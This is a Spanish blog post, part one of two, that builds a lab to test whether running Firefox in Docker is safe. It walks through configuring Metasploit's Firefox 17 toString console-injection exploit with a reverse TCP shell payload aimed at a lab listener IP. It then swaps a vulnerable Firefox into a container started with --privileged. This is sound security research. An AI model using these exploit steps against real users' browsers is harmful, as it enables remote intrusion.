---
title: Es seguro ejecutar Firefox en Docker? (1/2)
layout: post
---

Una vez más, estoy de vuelta listo para dar *guerra*. Si bien es cierto que llevo 2 post de retraso (por aquello de 1 post a la semana), tampoco quiero escribir por escribir, y no hablar sobre lo que ya se haya escrito hasta la saciedad.

Esta vez **os voy a contar** una paja mental que me lleva rondando por la cabeza desde hacía tiempo pero no había tenido tiempo para probar: **Ejecutar Firefox en Docker**. Cuando digo *Firefox*, léase una app de escritorio cualquiera.

Tras buscar por el *interé blanco*, he podido entrar información de como hacerlo pero... **cómo de seguro es ejecutar Firefox (o una app cualquiera) sobre Docker**.

Pues venga, vamos al lío...

# Por qué ejecutar Firefox en Docker?

Según lo veo yo, existen **2 motivos** por los que querríamos **ejecutar una App** de escritorio (Firefox en este caso) dentro de un contenedor de **Docker**:

- **Aislamiento de dependencias y portabilidad**: una de las principales ventajas que tiene Docker.
- **Seguridad**: Docker crea un contenedor para la app que queramos correr, creando una capa de abstracción y aislándolo del sistema operativo.
 
Nosotros vamos a centrarnos en la segunda opción. Según la filosofía y funcionamiento de Docker, **por qué podría ser buena idea correr Firefox en Docker?**

Seguro que sabéis perfectamente que todos los navegadores web tienen vulnerabilidades. Por mucho que los mantengamos actualizados, los *[0 day](https://es.wikipedia.org/wiki/Ataque_de_d%C3%ADa_cero)* siempre estarán ahí. Bajo esta premisa, es una buena idea ejecutar el navegador en un entorno de *sandbox* lo más aislado posible del sistema operativo *nativo* . Es decir: **si nos revientan el Firefox, que no puedan acceder al sistema operativo**. Algo muy parecido a lo que hace *[Sandboxie](http://www.sandboxie.com)*.

# Cuál es nuestro objetivo?

Bueno, dado que podemos ejecutar un Firefox en una *sandbox*, usando Docker, mi objetivo era **comprobar si esto realmente es seguro**.

# Entorno usado

**Software usado**

- Metasploit (la versión que viene con Kali 2.0).
- Firefox 17.0. Lo podéis descargar en: https://ftp.mozilla.org/pub/firefox/releases/17.0.1/
- Docker 1.11.1 para Ubuntu Linux.

**Infraestructura**

- Kali Linux 2.0
- Ubuntu Linux 14 - Kernel 3.13.0-83-generic.

**Usaremos Firefox 17** (una versión bastante desactualizada) porque **el objetivo es comprobar hasta donde llegaría un atacante** si explotara una vulnerabilidad de nuestra navegador, y esta versión de Firefox tiene una **vulnerabilidad conocida** y un **exploit público incluido en suite metasploit**.

# Procedimiento

Para poder comprobar lo expuesto, he tratado de hacer un análisis serio y riguroso. Y os pondré todos y cada una de los pasos que he seguido, para que lo podáis reproducir si queréis.

Pasos que seguiremos:

1. Creación de URL vulnerable con el exploit para Firefox 17, usando metasploit (la máquina Kali).
2. Creación y ejecución Firefox 17 con Docker, en el Docker-host (la máquina Ubuntu).
3. Visitaremos la URL vulnerable, con el Firefox 17 a fin de explotar la vulnerabilidad del Firefox.
4. Una vez esplotado el fallo, trataremos de ejecutar comandos en el Docker.
5. Trataremos de ejecutar comandos en sistema operativo base. Es decir: **Fuera del contenedor del Docker**.

# Pasos a seguir

## Creación de la URL vulnerable

Vamos con un poco de metasploit: **Tras actualizar metasploit** (comando: `msfupdate`) para asegurarnos que tenemos los últimos exploits, ejecutaremos el msfconsole:

```bash
# msfconsole
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


Validate lots of vulnerabilities to demonstrate exposure
with Metasploit Pro -- Learn more on http://rapid7.com/metasploit

       =[ metasploit v4.11.5-2016010401                   ]
+ -- --=[ 1517 exploits - 875 auxiliary - 257 post        ]
+ -- --=[ 437 payloads - 37 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf >
```

Ahora vamos a seleccionar el exploit para firefox `exploit/multi/browser/firefox_tostring_console_injection`:

```bash
msf> use exploit/multi/browser/firefox_tostring_console_injection
msf exploit(firefox_tostring_console_injection) > show info

       Name: Firefox toString console.time Privileged Javascript Injection
     Module: exploit/multi/browser/firefox_tostring_console_injection
   Platform:
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2013-05-14

Provided by:
  moz_bug_r_a4
  Cody Crews
  joev <joev@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Universal (Javascript XPCOM Shell)
  1   Native Payload

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  CONTENT                   no        Content to display inside the HTML <body>.
  Retries  true             no        Allow the browser to retry the module
  SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
  SRVPORT  8080             yes       The local port to listen on.
  SSL      false            no        Negotiate SSL for incoming connections
  SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
  URIPATH                   no        The URI to use for this exploit (default is random)

Payload information:

Description:
  This exploit gains remote code execution on Firefox 15-22 by abusing
  two separate Javascript-related vulnerabilities to ultimately inject
  malicious Javascript code into a context running with chrome://
  privileges.

References:
  http://cvedetails.com/cve/2013-1710/
```

Si observamos la salida salida el comando `show info`, en **la descripción, nos indica que dicho exploit** está disponible para las versiones de **Firefox 15-22**. De ahí que la versión elegida de Firefox sea la 17.

Seleccionamos ahora el **payload** a ejecutar tras la explotación del fallo. En nuestro caso lo que queremos es una shell, así que seleccionaremos el payload `firefox/shell_reverse_tcp`:

```bash

msf exploit(firefox_tostring_console_injection) > set payload firefox/shell_reverse_tcp
msf exploit(firefox_tostring_console_injection) > show options

...

Payload options (firefox/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal (Javascript XPCOM Shell)
```

Si hacemos un `show options` vemos que el payload necesita la IP donde queremos que escuche. Es decir: **donde se conectarán nuestras víctimas** una se haya explotado el fallo en el navegador: La IP donde está ejecutándose Metasploit:

```bash
msf exploit(firefox_tostring_console_injection) > set LHOST 10.211.55.61
```

Por último, ya solo tenemos que poner a escuchar metasploit:

```bash
msf exploit(firefox_tostring_console_injection) > run
[*] Exploit running as background job.

[*] Started reverse TCP handler on 10.211.55.61:4444
[*] Using URL: http://0.0.0.0:8080/7eeNxNzqd
[*] Local IP: http://10.211.55.61:8080/7eeNxNzqd
[*] Server started.
```

Y listo! Ahora solo tendremos que lograr que la víctima (nuestro Firefox vulnerable) se conecte a la URL: `http://10.211.55.61:8080/7eeNxNzqd`.

## Creación del Docker con Firefox 17

Como ya os he comentado, ya hay gente que se ha currado estas cosas. Por ejemplo: https://hub.docker.com/r/chrisdaish/firefox/~/dockerfile/ 

De este repositorio de Docker nos interesan 2 cosas:

- **Cómo crear el Docker**: El comando no es precisamente trivial. Veremos después el porqué. 
- **Modificar el Docker**: Tendremos que modificar el contenedor original para que se ejecute la versión de Firefox vulnerable, en lugar de la que viene pre-instalada. 

Antes de nada, **tendremos que haber descargado y descomprimido el Firefox 17** y dejarlo en una ubicación en la que el **Docker-host tenga acceso**. Para hacerlo un poco más dinámico, he usado la variable de BASH `FIREFOX` de modo que no tengamos que cambiar el comando, sino solamente esa variable.

Una vez tengamos claro esto, vamos a crear el Docker usando la imagen del autor. Para hacerlo ejecutaremos en el docker-host (Ubuntu) lo siguiente:

**IMPORTANTE**: Este comando no se puede ejecutar por SSH, ya que hace uso de las GTK y demás librerías gráficas.

```bash
# export FIREFOX=/media/psf/Home/Downloads/firefox-17
# docker run -it -v $FIREFOX:/home/firefox/Downloads:rw -v /tmp/.X11-unix:/tmp/.X11-unix -v /dev/snd:/dev/snd --privileged -e uid=$(id -u) -e gid=$(id -g) -e DISPLAY=unix$DISPLAY --name firefox chrisdaish/firefox
```

Vale, tras descargar unos 500 y pico megas, **se nos abrirá finalmente el Firefox**.

Antes de continuar vamos a ver qué estamos haciendo con cada parámetro:

- **-it**: le estamos diciendo a Docker que lo ejecute en una sesión interactiva y en un terminal.
- **-v**: montamos volúmenes de nuestro Docker-host al contenedor que estamos creando.
- **--privileged**: ejecutamos el Docker en modo privilegiado. Esto es necesario porque sino no tendríamos acceso a las funciones de renderizado gráfico, por ejemplo.
- **-e**: establecemos variables de entorno dentro del contenedor.
- **--name**: el nombre que daremos al contenedor.

Por qué necesitamos montar:

- `/tmp/.X11-unix`: Porque sino no tendremos acceso al X11 de Linux, y no podremos acceder al sistema de ventanas.
- `/dev/snd`: Porque sino no tendremos acceso al sonido del sistema, y puesto que queremos un Firefox completo (que reproduzca el sonido de los videos, por ejemplo) es necesario. 

**NOTA**: El procedimiento que voy a explicar se puede hacer de forma más elegante creando nuestro propio Dockerfile, pero dado que es una prueba de concepto, esta forma me ha resultado más rápida.

En este punto ya deberíamos tener un Firefox corriendo. La pega es que **no es vulnerable**, así que vamos a cambiar el Firefox que el contenedor lanza por el que hemos descargado. Lo que vamos a hacer es entrar al docker y cambiar el punto de entrada. Para eso haremos lo siguiente:

**Acceder al contenedor en ejecución** 

Sin parar el Docker (es decir, no cerréis el Firefox que os abrió), vamos a otro terminal y ejecutamos lo siguiente:

```bash
# docker exec -it firefox /bin/bash
```

Con esto accederemos al contenedor y podremos modificarlo. Ahora vamos a:

- Crear un enlace de ejecución en `/usr/bin` que apunte a nuestro Firefox vulnerable.
- Cambiar el fichero `/tmp/start-firefox.sh`. Este fichero es el que usa el autor del docker para indicarle al contenedor qué comando arrancar cuando éste se inicie.

Hacemos lo siguiente:

```bash
# docker exec -it firefox /bin/bash
root@3364ca6e69a1:/# ln -s /home/firefox/Downloads/firefox /usr/bin/firefox-17
root@3364ca6e69a1:/# cat /tmp/start-firefox.sh
#!/bin/bash
groupmod -g $gid firefox
usermod -u $uid -g $gid firefox

if [ -d /home/firefox/.mozilla ]; then
  chown -R firefox:firefox /home/firefox/.mozilla
fi

#
# EDITAMOS ESTA LINEA Y CAMBIAMOS: /usr/bin/firefox --> /usr/bin/firefox-17
#
# exec su -ls "/bin/bash" -c "/usr/bin/firefox-17 -profile /home/firefox/.mozilla/firefox $ARGS $URL" firefox
exec su -ls "/bin/bash" -c "/usr/bin/firefox-17 -profile /home/firefox/.mozilla/firefox $ARGS $URL" firefox
```

Et voìla! Ya lo tenemos todo listo! Cómo lo comprobamos? Fácil: Ya puedes cerrar el Firefox que el Docker nos abrió cuando lo instalamos. Cuando este se cierre, **re-arrancaremos el Docker**, solo que **esta vez se ejecutará con la versión vulnerable**:

```bash
# docker start firefox
```

Y por fin, si accedemos al navegador e indicamos la URL `about:config`, podréis ver que **la versión que está corriendo es la que 17**:

![firefox 17](/examples/2016-06-24-es-seguro-ejecutar-firefox-en-docker/firefox-17.jpg)


# Conclusión y próxima entrega

Hasta aquí el post de hoy. Sí, se que os dejo a medio, pero ya se está haciendo muy largo. Así que he decidido partirlo en 2.

**Hemos aprendido toda la base** y todo lo necesario para tener el entorno preparado. La próxima entrega, **la semana que viene**, acabaremos viendo:

- **Explotación** del Firefox.
- **Ejecución de comandos remotos** con metasploit en el Docker.
- Analizaremos la posibilidad de **acceder al sistema anfitrión**.

Chau!